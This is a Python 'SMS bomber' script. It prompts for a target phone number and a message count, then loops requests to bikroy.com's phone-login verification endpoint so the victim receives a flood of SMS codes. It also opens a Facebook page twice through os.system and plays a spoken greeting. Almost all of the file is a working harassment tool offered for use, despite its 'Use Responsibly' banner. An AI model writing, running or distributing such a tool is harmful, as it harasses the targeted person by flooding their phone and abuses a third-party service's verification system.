#-------<$$ DAVLOPER :-- KALYAN KING ðŸ‘»$$$>----
#-----<$$ TOOL :--- SMS BOMBERS $$$-->------
import os
import sys
import json
import uuid
import string
import random
import requests
import time

#-----------<$$$ COLOR CODE $$$>----------
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'

#------<$$$ Clear Screen Function $$$>-------
def clear():
    os.system('clear')

clear()

#----------<$$$ Welcome Message $$$>---------
print(f"{RED}============================================{RESET}")
time.sleep(0.3)
print(f"{GREEN}         WELCOME BRO!{RESET}")
time.sleep(0.3)
print(f"{YELLOW}       SMS BOMBER TOOL - {CYAN}KALYAN KING{RESET}")
time.sleep(0.3)
print(f"{RED}============================================{RESET}")
time.sleep(0.3)
print()
print(f"{YELLOW}          Developed by: {YELLOW}Kalyan King{RESET}")
time.sleep(0.3)
print(f"{CYAN}          Use Responsibly!{RESET}")
time.sleep(0.3)
print(f"{GREEN}          Version {RESET} 0.1")
time.sleep(0.3)
print()
os.system('espeak -a 150 "Welcome bro, SMS Bomber Tool, Kalyan King"')

#-----------<$$$ Delay Before Banner $$$>-----------
time.sleep(1)
clear()
#----------<$$$ Open Facebook GUROP $$$>------
os.system(" xdg-open https://facebook.com/Siyam6252")
os.system(" xdg-open https://facebook.com/Siyam6252")
#-----------<$$$ ASCII Banner $$$>-----------
banner = f"""{GREEN}
   _____ __  ________    ____  ____  __  ___   
  / ___//  |/  / ___/   / __ )/ __ \/  |/  /   
  \__ \/ /|_/ /\__ \   / __  / / / / /|_/ /    
 ___/ / /  / /___/ /  / /_/ / /_/ / /  / /     
/____/_/  /_//____/  /_____/\____/_/  /_/      SIYAM KING
{RESET}"""
print(banner)

#-------------<$$$ Target Input $$$>-------------
target = input(f"{CYAN}[+] Enter Target Number (880xxxxxxxxxx): {RESET}")
limit = int(input(f"{CYAN}[+] Enter Number of SMS to Send: {RESET}"))

#-------------<$$$ API Function $$$>-------------
def send_sms_bikroy(number):
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}"
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/json'
    }
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            print(f"{GREEN}[+] SMS Sent to {number}{RESET}")
        else:
            print(f"{RED}[-] Failed to Send SMS | Status Code: {response.status_code}{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error: {e}{RESET}")

#-------------<$$$ SMS Bombing Loop $$$>-------------
print(f"\n{YELLOW}[*] Starting SMS Bombing...{RESET}\n")
for i in range(limit):
    send_sms_bikroy(target)
    time.sleep(1) 

print(f"\n{GREEN}[âœ“] Completed! Sent {limit} requests to {target}{RESET}")